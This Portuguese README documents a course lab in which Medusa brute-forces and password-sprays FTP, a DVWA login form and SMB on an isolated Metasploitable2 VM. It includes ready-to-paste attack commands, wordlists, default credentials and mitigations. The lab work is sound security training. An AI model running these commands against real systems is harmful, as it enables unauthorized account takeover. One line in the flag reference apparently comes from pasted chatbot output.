# README.md — Simulação de Ataques de Força Bruta com Medusa (Kali + Metasploitable)

## Resumo

Este repositório documenta o projeto realizado para o desafio da DIO: simular ataques de **força bruta** e **password spraying** com a ferramenta **Medusa**, em um ambiente isolado (Kali Linux atacando Metasploitable2/DVWA).

* **Alvo (up):** `192.168.56.102`
* **Atacante (Kali):** `192.168.56.103`

**Objetivo:** demonstrar como ataques de força-bruta funcionam contra FTP, formulários web (DVWA) e SMB; registrar os comandos, evidências e recomendações de mitigação.

---

## Estrutura do repositório

```
README.md
wordlists/
  users.txt
  pass.txt
  users_DVWA.txt
  pass_DVWA.txt
  smb_users.txt
  senhas_spray.txt
evidence/
  medusa_ftp_out.txt
  medusa_http_out.txt
  medusa_smb_out.txt
  captura_lab.pcap
  screenshots/
```

---

## Ambiente

* VirtualBox: 2 VMs (Kali Linux e Metasploitable2 com DVWA).
* Rede: **Host-only / Internal Network** (isola o laboratório do resto da rede).
* Snapshots criados antes dos testes.
* Ferramentas principais: `medusa`, `nmap`, `ftp`/`smbclient`.

---

## Metodologia (resumida)

1. Planejamento: definir objetivos, criar wordlists e snapshots das VMs.
2. Enumeração: mapear portas/serviços com `nmap`.
3. Execução: rodar Medusa para FTP, web-form e SMB (password spraying).
4. Evidências: salvar saídas, capturar pcap e fazer screenshots.
5. Mitigação: propor configurações e controles para reduzir risco.

---

## Enumeração (exemplo)

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.102
```

Serviços encontrados (exemplo): FTP (21), SSH (22), HTTP/DVWA (80), SMB (139/445).

---

## Wordlists (exemplos)

Crie listas simples para demonstrar o ataque:
•	echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

```
user
msfadmin
admin
root
```

•	echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

```
123456
password
qwerty
msfadmin
```

•	echo -e "user\nmsfadmin\nadmin\nroot" > users_DVWA.txt

```
user
msfadmin
admin
root
```

•	echo -e "123456\npassword\nqwerty\nmsfadmin" > pass_DVMA.txt

```
123456
password
qwerty
msfadmin
```

•	echo -e "user\nmsfadmin\nservice" > smb_users.txt

```
user
msfadmin
service
```

•	echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

```
password
123456
Welcome123
msfadmin
```

---

## Comandos usados (resumo) — copie/cole

**FTP**

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```

**Web form (DVWA)** — ajuste `-m` conforme o formulário da sua instância:

```bash
medusa -h 192.168.56.102 -U users_DVWA.txt -P pass_DVWA.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```

**SMB (password spraying)**

```bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T50
```

> Observação: esses comandos são exemplos para o ambiente controlado. Ajuste threads (`-t`), módulos (`-M`) e parâmetros `-m` conforme necessário.

---

## Validação das descobertas

* **FTP:** `ftp 192.168.56.102` → testar login com a credencial encontrada (ex.: `msfadmin:msfadmin`).
* **Web:** acessar `http://192.168.56.102/dvwa` e testar login no navegador com as credenciais descobertas (ex.: `admin:password`).
* **SMB:** `smbclient -L //192.168.56.102 -U msfadmin` → autenticar com a senha descoberta.

---

## Mitigações e Recomendações

* Política de senhas seguras (tamanho e entropia).
* Rate limiting e bloqueio temporário/permanente após N tentativas.
* Autenticação multifator (MFA).
* Logging e alertas (SIEM) para detectar tentativas em massa.
* Harden SMB: desabilitar SMBv1, aplicar ACLs e segmentar rede.
* Proteção de formulários web: CAPTCHA, WAF, bloqueio por IP, análise de comportamento.
* Auditorias periódicas e uso de listas de senhas proibidas.

---

## Conclusão

Neste laboratório aprendi a usar `nmap` para enumerar serviços e `medusa` para automatizar ataques de força-bruta/password-spraying em serviços comuns (FTP, web-form e SMB). O teste foi limitado ao ambiente simulado; como próximos passos,
recomenda-se testar com wordlists maiores, configurar lockout e medir tempos de quebra para diferentes políticas de senha.

---

## Observações éticas

Os testes foram realizados exclusivamente em VMs isoladas e com propósito educacional. **Nunca** execute testes de intrusão em sistemas reais sem autorização explícita.

---

## Referência rápida — explicação resumida das flags usadas nos comandos

Abaixo explico, de forma curta, o que cada flag usada nos comandos acima faz.

* `-h <host>`
  Define o alvo (IP ou hostname) onde o Medusa vai executar as tentativas.

* `-U <arquivo>`
  Arquivo com a lista de **usuários** (uma conta por linha).

* `-P <arquivo>`
  Arquivo com a lista de **senhas** (uma senha por linha).

* `-M <módulo>`
  Módulo/protocolo a ser testado (ex.: `ftp`, `http`, `smbnt`, etc.). Determina como o Medusa tenta autenticar.

* `-t <n>`
  Número de **threads** concorrentes (paralelismo). Aumentar acelera as tentativas, mas consome mais recursos e pode gerar tráfego intenso.

* `-m PAGE:'<caminho>'` (usado com `-M http`)
  Indica a página/alvo do formulário (ex.: `/dvwa/login.php`) — usado quando o módulo precisa saber a URL do form.

* `-m FORM:'<template>'` (usado com `-M http`)
  Define o formato do corpo do formulário, usando `^USER^` e `^PASS^` como placeholders que o Medusa substitui durante as tentativas. Ex.: `username=^USER^&password=^PASS^&Login=Login`.

* `-m 'FAIL=<texto>'`
  Texto que indica falha no login (a resposta do servidor contém essa string quando o login falha), usado para o Medusa detectar tentativas malsucedidas.

* `-T50`
  **Atenção:** o significado exato de `-T` pode variar conforme a versão ou compilação do Medusa (algumas versões usam `-T` para tempo limite, outras para um parâmetro diferente). 
**Recomendo confirmar localmente** com `medusa -h` ou `man medusa` antes de usar `-T`. (Se preferir, eu verifico o significado na sua versão local do Medusa — basta me dizer se quer que eu inclua o comando de verificação.)

* `-f`
  (quando usado) Faz o Medusa **parar** quando encontra a primeira credencial válida para um usuário/serviço.

* `-o <arquivo>`
  (quando usado) Grava a saída/resultados em arquivo. Útil para evidências.


